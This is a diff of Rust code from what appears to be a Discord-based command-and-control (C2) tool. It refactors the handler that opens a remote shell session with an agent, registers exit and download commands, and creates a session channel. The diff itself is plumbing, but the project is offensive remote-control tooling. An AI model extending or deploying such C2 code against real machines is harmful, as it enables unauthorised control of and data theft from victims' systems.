@@ -1,7 +1,7 @@
 use crate::{
     commands::shell::{download, exit},
     discord_utils::bot_functions::{
-        send_channel_message, send_code_message, send_ephemeral_response,
+        send_channel_message, send_code_message, send_edit_response, send_ephemeral_response,
     },
     discord_utils::channels::create_text_channel,
     errors::DiscordC2Error,
@@ -25,7 +25,7 @@ use anyhow::Error;
 use chrono::Utc;
 use lazy_static::lazy_static;
 use tokio::sync::Mutex;
-use tracing::{info as informational, warn, error};
+use tracing::{error, info as informational, warn};
 
 lazy_static! {
     pub static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
@@ -133,13 +133,17 @@ pub async fn run(
     ctx: &Context,
     options: &[CommandDataOption],
 ) -> Result<(String, Option<ShellType>), DiscordC2Error> {
+    let mut agent = get_or_create_agent(ctx).await;
+
     /* Checking if the shell type/process was improperly configured */
-    let shell_type = SHELL_TYPE.lock().await;
+    let mut shell_type = SHELL_TYPE.lock().await;
     if shell_type.is_some() {
         match ProcessHandler::is_instantiated().await {
             true => {
-                warn!("The shell {:?} was already instantiated, what is bro doing?", shell_type);
-                let agent = get_or_create_agent(ctx).await;
+                warn!(
+                    "The shell {:?} was already instantiated, what is bro doing?",
+                    shell_type
+                );
                 return Ok((
                     format!(
                         "***Command session has already been initialized in channel <#{}>!***",
@@ -150,7 +154,7 @@ pub async fn run(
             }
             false => {
                 warn!("Possibly stale session?");
-                *SHELL_TYPE.lock().await = None;
+                *shell_type = None;
                 return Ok((
                     "Hmm... Something went wrong. Possibly a stale session.".to_string(),
                     None,
@@ -159,7 +163,6 @@ pub async fn run(
         }
     }
 
-    let mut agent = get_or_create_agent(ctx).await;
     let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string(); //TODO: Cleanup this date format
 
     // Grab the session type from options
@@ -170,36 +173,44 @@ pub async fn run(
         .as_ref()
         .ok_or_else(|| DiscordC2Error::DiscordError(String::from("Expected a resolved option")))?;
 
-    // Create a channel for the remote session, and set the name/topic appropriately
-    let session_channel = create_text_channel(ctx, &now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
-    agent.set_session_channel(Some(session_channel))?; // Update the agent's session channel attribute (this also updates the JSON configuration).
-
-    let string = format!(
-        "Successfully created command session channel at <#{}>",
-        session_channel
-    );
-
     let ctx1 = ctx.to_owned();
     let ctx2 = ctx.to_owned();
 
     tokio::try_join!(
         tokio::spawn(async {
             match Command::create_global_application_command(ctx1, exit::register).await {
-                Ok(_) => (),
+                Ok(_) => {
+                    informational!("Successfully registered exit command.");
+                },
                 Err(why) => {
                     error!("Failed to register the exit command: {:?}", why);
-                },
+                }
             }
         }),
         tokio::spawn(async {
             match Command::create_global_application_command(ctx2, download::register).await {
-                Ok(_) => (),
+                Ok(_) => {
+                    informational!("Successfully registered download command.");
+                },
                 Err(why) => {
                     error!("Failed to register the download command: {:?}", why);
-                },
+                }
             }
         }),
     )?;
+
+    // Create a channel for the remote session, and set the name/topic appropriately
+    let session_channel = create_text_channel(ctx, &now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
+    tokio::spawn(async move {
+        if let Err(why) = agent.set_session_channel(Some(session_channel)) {
+            error!("{}", why);
+        }
+    }); // Update the agent's session channel attribute (this also updates the JSON configuration).
+
+    let string = format!(
+        "Successfully created command session channel at <#{}>",
+        session_channel
+    );
 
     if let CommandDataOptionValue::String(shell_type) = option {
         let (content, shell) = match shell_type.as_str() {
@@ -227,7 +238,7 @@ pub async fn run(
         };
         Ok((content.to_string(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
     } else {
-        Ok(("No options were specified.".to_string(), None))
+        Ok(("No options were specified.".to_string(), None)) // This will never happen as far as I know.
     }
 }
 
@@ -267,15 +278,17 @@ pub async fn session_handler(
     ctx: &Context,
     command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
+    let response = send_ephemeral_response(ctx, command, "Creating session....", None).await?;
     let (content, shell) = run(ctx, &command.data.options).await?;
-    send_ephemeral_response(ctx, command, &content, None).await?;
+
+    send_edit_response(ctx, &response, content).await?;
 
     if shell.is_some() {
         // Store shell_type in the global variable
         *SHELL_TYPE.lock().await = Some(shell.unwrap());
-        println!("Shell Type in handle_session: {:?}", shell);
+        informational!("ShellType in handle_session: {:?}", shell);
     } else {
-        informational!("Shell type was null");
+        informational!("ShellType was null.");
     }
 
     Ok(())
